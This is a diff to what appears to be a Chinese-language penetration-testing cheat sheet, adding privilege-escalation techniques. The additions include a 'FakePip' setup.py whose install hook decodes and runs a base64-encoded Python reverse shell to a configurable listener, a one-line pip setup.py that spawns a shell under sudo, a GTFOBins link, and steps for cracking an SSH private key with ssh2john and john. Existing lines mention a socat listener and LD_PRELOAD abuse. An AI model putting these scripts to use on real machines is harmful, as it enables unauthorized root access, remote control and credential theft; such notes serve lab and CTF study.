@@ -111,6 +111,12 @@ socat file:`tty`,raw,echo=0 tcp-listen:9999
 
 ### 提权
 
+```
+https://gtfobins.github.io/
+```
+
+这里面很多实用的
+
 #### linux
 
 基本上先看`sudo -l`
@@ -198,8 +204,77 @@ ls -al shell.so
 sudo LD_PRELOAD=path/shell.so find
 ```
 
+###### pip提权
+
+1
+
+```
+下载fakepip文件
+
+#setup.py
+from setuptools import setup
+from setuptools.command.install import install
+import base64
+import os
+
+
+class CustomInstall(install):
+  def run(self):
+    install.run(self)
+    LHOST = 'localhost'  # change this
+    LPORT = 13372
+    
+    reverse_shell = 'python -c "import os; import pty; import socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\'{LHOST}\', {LPORT})); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); os.putenv(\'HISTFILE\', \'/dev/null\'); pty.spawn(\'/bin/bash\'); s.close();"'.format(LHOST=LHOST,LPORT=LPORT)
+    encoded = base64.b64encode(reverse_shell)
+    os.system('echo %s|base64 -d|bash' % encoded)
+
+
+setup(name='FakePip',
+      version='0.0.1',
+      description='This will exploit a sudoer able to /usr/bin/pip install *',
+      url='https://github.com/0x00-0x00/fakepip',
+      author='zc00l',
+      author_email='andre.marques@esecurity.com.br',
+      license='MIT',
+      zip_safe=False,
+      cmdclass={'install': CustomInstall})
+```
+
+创建个文件夹 把setup.py放进去
+
+```
+sudo /usr/bin/pip install . --upgrade --force-reinstall
+运行
+```
+
+或者
+
+```
+TF=$(mktemp -d)
+echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
+sudo pip install $TF
+```
+
 
 
 #### windows
 
 ### 后门
+
+
+
+
+
+
+
+### 杂
+
+###### ssh密匙利用
+
+```
+先用ssh2john把私匙转换hash
+在john跑字典 
+chmod 600 private_key
+ssh user@ip -i private_key
+```
+
